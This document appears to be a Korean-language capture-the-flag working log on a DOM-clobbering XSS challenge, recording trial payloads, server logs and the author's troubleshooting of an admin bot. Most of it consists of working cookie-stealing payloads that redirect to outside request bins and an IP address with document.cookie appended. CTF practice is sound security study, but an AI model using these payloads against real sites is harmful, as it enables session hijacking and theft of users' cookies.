# 제작중..

# 삽질
<a href="report">test</a>
<a href="/report">test</a>
<a href="//www.naver.com">test</a> -> RPO 언인텐..?

<a href='javascript:document.location="https://www.naver.com" id='CONFIG' name='main'>link</a> <a id='CONFIG' name='debug'></a> -> 안됨

<a href='https://www.naver.com' id="CONFIG" name='main'>link</a> <a id='CONFIG' name='debug'></a> -> 됨

<a href='https://www.naver.com'>link</a> <a id='CONFIG' name='debug'></a> -> 됨

<a href='javascript:document.location="https://054e-118-235-6-100.ngrok-free.app"+"1234"' id="CONFIG" name='main'>main</a> <a id='CONIFG' name='debug'>notu</a>

https://pipedream.com/@s3curity/invite?token=6008fca8296b9c31613d9b60c5f59cc1

practice?content=<a href="javascript:document.location='https://www.naver.com'" id='CONFIG' name='main'>sadf</a><a href='id='CONFIG' name='debug'></a>

<a id="CONFIG">bypass</a>
<a id="CONFIG" name="location" href="javascript:document.location='https://www.google.com'">href</a>



# 첫 xss 성공
아래의 url로 접근하면 xss가 성공함
http://ssh.knock-on.org:10010/practice?content=<a id="CONFIG">bypass</a><a id="CONFIG" name="location" href="javascript:document.location='https://www.google.com'">href</a>

이를 기반으로 최종 페이로드를 짜봤는데, 이슈가 있음


### 페이로드 1
일단 아래와 같이 임시 도메인에 쿠키를 받기 위한 요청을 HTML 폼에 전달하여 보내면
http://ssh.knock-on.org:10010/practice에서 GET 폼에 아래의 데이터를 넣어줌
content -> <a id="CONFIG">bypass</a><a id="CONFIG" name="location" href="javascript:document.location='https://enm9ufkipz1p.x.pipedream.net/'+document.cookie">href</a>

서버에서 아래와 같이 인코딩된 데이터를 받음
app_1  | 222.233.23.200 - - [03/May/2024 08:16:53] "GET /practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a>%0D%0A HTTP/1.1" 200 -

결과 -> xss 성공, 서버에 쿠키가 잘 전달됨

단순하게 서버입장에서 저런 페이로드를 받았으니까 /report 엔드포인트에서 서버에서 찍힌 'practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a>%0D%0A' 이 페이로드 그대로 사용해보기로함

서버로그는 아래와같음
app_1  | 127.0.0.1 - - [03/May/2024 08:19:29] "GET /practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a>%0D%0A HTTP/1.1" 200 -

보면 알 수 있듯이 서버입장에서는 동일한 데이터를 받을 수 있음. 위는 /practice, 아래는 /report에서 전달한 페이로드
practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a>%0D%0A
practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a>%0D%0A

그런데 아래는 xss에 실패하고, 서버에는 쿠키가 전달 안됨..


### 페이로드 2
생각해보니까 어차피 /report에서 URL로 쏴주니까 HTML 폼에서 보낼게 아니라 URL에서 직접 보내야할 것 같음
http://ssh.knock-on.org:10010/practice?content=<a id="CONFIG">bypass</a><a id="CONFIG" name="location" href="javascript:document.location='https://enm9ufkipz1p.x.pipedream.net/'+document.cookie">href</a>
결과 -> 실패

인코딩 이슈일 것 같아서 아래와 같이 인코딩을 한 상태로 페이로드를 넘겨봤음
http://ssh.knock-on.org:10010/practice?content=%3Ca%20id%3D%22CONFIG%22%3Ebypass%3C%2Fa%3E%3Ca%20id%3D%22CONFIG%22%20name%3D%22location%22%20href%3D%22javascript%3Adocument.location%3D%27https%3A%2F%2Fenm9ufkipz1p.x.pipedream.net%2F%27%2Bdocument.cookie%22%3Ehref%3C%2Fa%3E

서버 로그
app_1  | 118.235.13.230 - - [03/May/2024 10:20:56] "GET /practice?content=<a%20id%3D"CONFIG">bypass</a><a%20id%3D"CONFIG"%20name%3D"location"%20href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a> HTTP/1.1" 200 -

결과 -> xss 성공, 서버에 쿠키가 잘 전달됨

같은 방식으로 다시 /report 엔드포인트에서 서버 로그에 찍힌 페이로드를 그대로 사용해봤음
서버로그
app_1  | 127.0.0.1 - - [03/May/2024 08:28:41] "GET /practice?content=<a%20id%3D"CONFIG">bypass</a><a%20id%3D"CONFIG"%20name%3D"location"%20href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a> HTTP/1.1" 200 -

분명 동일한 페이로드가 전달되었음
practice?content=<a%20id%3D"CONFIG">bypass</a><a%20id%3D"CONFIG"%20name%3D"location"%20href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a>
practice?content=<a%20id%3D"CONFIG">bypass</a><a%20id%3D"CONFIG"%20name%3D"location"%20href%3D"javascript:document.location%3D'https://enm9ufkipz1p.x.pipedream.net/'%2Bdocument.cookie">href</a>


그런데 결과적으로 xss에 실패하고, 서버에는 쿠키가 전달 안됨..

봇문젠가..? 실제 xss가 성공해서 리다이렉트 되는 속도보다 봇이 xss 당하는 속도보다 느린 것 같음 
봇이 뭔가 /practice까지는 갔다오는데, requestbin까지는 안들리고 오는 느낌..? -> 가능성있긴해서 requestbin 말고 local에서 서버 열고 해봄

http://211.250.216.249:7000/

<a id="CONFIG">bypass</a><a id="CONFIG" name="location" href="javascript:document.location='http://211.250.216.249:7000/'+document.cookie">href</a>

app_1  | 211.250.216.249 - - [05/May/2024 13:37:24] "GET /practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'http://211.250.216.249:7000/'%2Bdocument.cookie">href</a> HTTP/1.1" 200 -

practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'http://211.250.216.249:7000/'%2Bdocument.cookie">href</a>

practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:document.location%3D'http://211.250.216.249:7000/'%2Bdocument.cookie">href</a>

practice?content=<a+id%3D"CONFIG">bypass</a><a+id%3D"CONFIG"+name%3D"location"+href%3D"javascript:location.href%3D'https://vftafne.request.dreamhack.games/'%2Bdocument.cookie">href</a>

는 개소리였고 걍 봇이 안되는거였음 봇 바꾸니까 익스됨 ㅅㅄㅄㅄㅄㅂ
